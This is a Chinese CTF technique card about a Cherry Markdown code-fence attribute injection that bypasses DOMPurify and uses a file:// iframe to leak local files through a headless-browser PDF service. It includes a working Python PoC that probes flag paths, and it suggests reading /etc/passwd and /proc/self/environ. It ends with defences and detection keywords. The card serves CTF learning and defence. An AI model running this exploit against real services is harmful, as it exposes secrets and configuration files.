---
id: ctf-web-cherry-markdown-fence-lang-file-uri-iframe-pdf-exfil
title: Cherry Markdown 代码围栏语言名注入 + file:// 渲染页 iframe 读取本地文件并输出 PDF
type: scenario
domain: ctf
path: ctf/web
technique: cherry-markdown-fence-lang-html-injection-file-uri
aliases:
- Cherry Markdown 代码围栏注入
- data-lang 属性注入
- file:// 渲染页 XSS
- iframe 读取本地文件
- 无头浏览器 PDF 外带
tags:
- ctf
- web
- markdown
- cherry-markdown
- html-injection
- xss
- headless-browser
- file-uri
- pdf
- local-file-read
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T01:59:37+08:00'
  notes: 已对照原文核对；Cherry 围栏语言名未转义、先缓存后清洗、file:// iframe 读 flag 链一致；原文注明版本敏感且有实例复测失效，卡内 confidence=medium 已如实标注
---

## 一句话结论

Markdown 转 PDF 服务把用户 Markdown 交给 Cherry Markdown 渲染，而 Cherry 的 `renderCodeBlock` 会把代码围栏语言名原样拼进 `data-lang="${lang}"`（只 trim/lowercase，不转义），且渲染顺序是“先生成 fence HTML 并缓存 → 再 DOMPurify → 再把缓存 HTML 还原”，导致 fence 内容绕过清洗；渲染页本身位于 `file:///tmp/renders/`，注入的 `<iframe src=file:///flag>` 会把本地 flag 渲染进版面，最终随 PDF 返回。

## 原理

- Cherry Markdown 的代码围栏渲染把语言名写入属性：`<pre data-lang="${lang}">`。语言名只经过 `trim()` 和 `toLowerCase()`，没有 HTML 属性转义，因此 `"` 可以闭合属性并注入任意标签。
- 关键在渲染顺序：fence 先被渲染成 HTML 并缓存，之后整段 HTML 才过 DOMPurify 白名单，最后把缓存中的原始 fence HTML 还原回去。DOMPurify 处理的是缓存前的中间结果，攻击者注入的标签在还原阶段重新出现，等于绕过了清洗。
- 服务端在无头浏览器中打开 `file:///tmp/renders/<id>.html` 并打印 PDF。页面继承 `file://` 源，同源 iframe 可以加载 `file:///flag` 等本地文件；打印时 iframe 内容已经布局，`pdftotext` 能直接读出。
- 语言名被转成小写，所以 `file:///` 之后的路径必须全小写；一次只测一个路径，或对多个候选路径各生成一页批量提交。
- 该链对 Cherry 版本/模板敏感：若目标使用 `pre data-lang` 的简单模板，注入直接生效；若模板或后置清洗器把 fence 输出转义成文本，则同一条 payload 失效。原文在另一实例复测时即遇到后者，官方实例的旧 build 成功。

## 触发条件

- 存在“用户提交 Markdown → 无头浏览器渲染 → 返回 PDF”的服务，且渲染页通过 `file://` 打开（而非 `http://` 或 `data:`）。
- 使用的 Cherry Markdown 版本/模板会把语言名未转义地拼进 `data-lang`，且 fence 缓存先于清洗/还原。
- 目标本地存在渲染进程可读的敏感文件（flag、配置、密钥），且 PDF 内容会回传给攻击者。
- 语言名长度/字符没有额外白名单限制。

## 利用步骤

1. 向 `/render` 提交 `Content-Type: text/plain` 的 Markdown，确认返回 `application/pdf`，并观察渲染中间页地址为 `file:///tmp/renders/`。
2. 构造语言名为 `x"><iframe src=file:///flag width=800 height=600></iframe>` 的代码围栏，正文随意写一行。
3. 提交后取回 PDF，用 `pdftotext` 或 `pypdf` 提取文本；若第一页出现 `flag{...}` 即命中。
4. 对 `/flag`、`/flag.txt`、`/app/flag`、`/home/ctf/flag`、`/root/flag` 等候选路径批量生成页面，逐个提取文本；注意路径全小写。
5. 若返回的 PDF 只有 `File not found`，说明 iframe 加载被同源策略/文件权限/清洗器阻断，检查渲染页协议与 Cherry 模板。

## PoC

```python
import subprocess, tempfile, requests

BASE = "http://target:3000"
PATHS = ["/flag", "/flag.txt", "/app/flag", "/home/ctf/flag", "/root/flag"]

def payload(path):
    lang = 'x"><iframe src=file://%s width=800 height=600></iframe>' % path
    return "```%s\ntest\n```\n" % lang

def pdf_text(blob):
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        f.write(blob); name = f.name
    try:
        return subprocess.run(["pdftotext", name, "-"], capture_output=True, text=True, timeout=30).stdout
    finally:
        import os; os.unlink(name)

for path in PATHS:
    r = requests.post(BASE + "/render", data=payload(path).encode(),
                      headers={"Content-Type": "text/plain"}, timeout=180)
    if r.status_code == 200 and r.content.startswith(b"%PDF"):
        text = pdf_text(r.content)
        print("==", path, text[:500])
        if "flag{" in text or "DASCTF{" in text:
            break
```

## 变体与关联

- 属性边界可用单引号（若模板用 `data-lang='...'`）、反引号或未加引号的属性；标签可用 `iframe`、`object`、`embed`、`img` 等能触发 `file://` 加载的载体。
- 若 PDF 生成器在打印前等待网络空闲，iframe 加载本地文件通常仍会完成；若被拦截，可尝试 `file:///proc/self/environ`、`file:///etc/passwd` 等不同敏感路径。
- 关联：Markdown/HTML 注入类 XSS 卡、无头浏览器 SSRF/本地文件读取类卡；本质是“渲染管线顺序错误导致 sanitizer bypass”，不是 Cherry 独有。

## 检测与防御

- 对语言名做 HTML 属性转义或只允许 `[a-z0-9_+-]` 白名单；不要把它直接拼进属性。
- 修正渲染顺序：先清洗再缓存，或对缓存内容做二次清洗；不要“先缓存原始 HTML 再还原”。
- 渲染进程使用低权限用户，文件系统只挂载必要目录；不要把 flag/密钥放在渲染进程可读路径。
- 无头浏览器加 CSP/sandbox，禁止 `file://` 子资源；PDF 服务返回前做内容审查。
- 检测：Markdown 代码围栏语言名包含 `<`、`>`、`"`、`'`、`onerror`、`iframe`；渲染页出现非预期标签；PDF 文本中出现本地文件内容。
